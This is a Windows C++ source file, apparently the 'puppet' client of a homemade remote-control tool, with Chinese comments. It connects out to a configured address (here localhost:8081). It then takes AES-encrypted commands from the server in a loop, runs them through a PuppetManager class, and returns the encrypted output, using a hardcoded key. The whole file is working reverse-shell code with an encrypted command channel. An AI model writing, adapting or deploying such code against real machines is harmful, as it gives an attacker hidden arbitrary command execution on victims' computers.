#include<iostream>
#include<WinSock2.h>
#include <ws2tcpip.h>
#include<Windows.h>
#include<vector>

#include "PuppetManager.h"
#include "AES.h"

#pragma comment(lib,"ws2_32.lib")

#define CMD_LEN_BUF 4096

BOOL StartShell(const char* pcszIP, const char* usPort1) {
    std::cout << "Creating PuppetManager..." << std::endl;

    USHORT usPort;
    try {
        usPort = static_cast<USHORT>(std::stoi(usPort1));
    }
    catch (...) {
        std::cerr << "Invalid port number" << std::endl;
        return FALSE;
    }

    PuppetManager* puppetManager = new PuppetManager();
    SOCKET hSock = INVALID_SOCKET;

    // 初始化Winsock
    WSADATA stData;
    if (WSAStartup(MAKEWORD(2, 2), &stData) != 0) {
        delete puppetManager;
        return FALSE;
    }

    // 创建套接字
    hSock = socket(AF_INET, SOCK_STREAM, 0);
    if (hSock == INVALID_SOCKET) {
        delete puppetManager;
        WSACleanup();
        return FALSE;
    }

    // 设置服务器地址
    SOCKADDR_IN stSockAddr = { 0 };
    stSockAddr.sin_family = AF_INET;
    stSockAddr.sin_port = htons(usPort);
    if (inet_pton(AF_INET, pcszIP, &stSockAddr.sin_addr) <= 0) {
        std::cerr << "Invalid address format" << std::endl;
        closesocket(hSock);
        delete puppetManager;
        WSACleanup();
        return FALSE;
    }

    // 连接重试逻辑（5次，间隔1秒）
    bool connected = false;
    for (int retry = 0; retry < 5; ++retry) {
        if (connect(hSock, (SOCKADDR*)&stSockAddr, sizeof(stSockAddr)) == 0) {
            connected = true;
            break;
        }
        std::cerr << "Connection attempt " << (retry + 1) << " failed" << std::endl;
        Sleep(1000);
    }

    if (!connected) {
        closesocket(hSock);
        delete puppetManager;
        WSACleanup();
        return FALSE;
    }

    std::cout << "Connected to server!" << std::endl;

    std::vector<char> buffer(CMD_LEN_BUF);
    while (true) {
        // 阻塞接收命令
        int iRet = recv(hSock, buffer.data(), buffer.size() - 1, 0);

        if (iRet == SOCKET_ERROR) {
            int errCode = WSAGetLastError();
            if (errCode == WSAEWOULDBLOCK) {
                Sleep(100);  // 等待 100ms 后继续尝试
                continue;
            }
            else {
                std::cerr << "Receive error: " << errCode << std::endl;
                break;
            }
        }

        if (iRet == 0) {
            std::cout << "Connection closed by server" << std::endl;
            break;
        }

        // 处理接收数据
        buffer[iRet] = '\0';
        std::string cmd(buffer.data(), iRet);

        std::string key = "weiweiSecretKey123!";

        cmd = Encrypt::decodeByAES(cmd, key);

        cmd.erase(cmd.find_last_not_of("\r\n") + 1);  // 清理换行符

        std::cout << "Received command: " << cmd << std::endl;

        // 处理退出命令
        if (cmd.substr(0,4) == "exit") {
            std::string exitMsg = "byby dear shiyue!!!";

            exitMsg = Encrypt::encodeByAES(exitMsg,key);
            exitMsg = std::to_string(exitMsg.size()) + ":" + exitMsg;
            send(hSock, exitMsg.c_str(), exitMsg.size(), 0);
            std::cout << "Exit command received. Closing connection..." << std::endl;
            break;
        }

        // 执行命令
        puppetManager->setCmdList(cmd);
        std::string result = puppetManager->exec();

        // 发送执行结果
        if (result.empty()) {
            result = "No output!!!";
        }

        result = Encrypt::encodeByAES(result, key);

        result = std::to_string(result.size()) + ":" + result;

        int sendResult;
        if ((sendResult = send(hSock, result.c_str(), result.size(), 0)) == SOCKET_ERROR) {
            std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
            break;
        }

        std::cout << "Command executed and result sent to server." << std::endl;

        // 清空缓冲区
        //buffer.clear();
    }

    // 清理资源
    shutdown(hSock, SD_BOTH);
    closesocket(hSock);
    WSACleanup();
    delete puppetManager;

    return TRUE;
}

int main(int argc, char* argv[]) {

	std::cout << "傀儡端启动!!!" << std::endl;

	/*if (3 != argc) {

		std::cout << "参数数量错误，需要ip地址和端口号!!!" << std::endl;

		return -1;
	}

	char* host = argv[1];
	char* port = argv[2];*/
    
    const char* host = "127.000.000.001";
	const char* port = "08081";

	StartShell(host,port);

	return 0;
}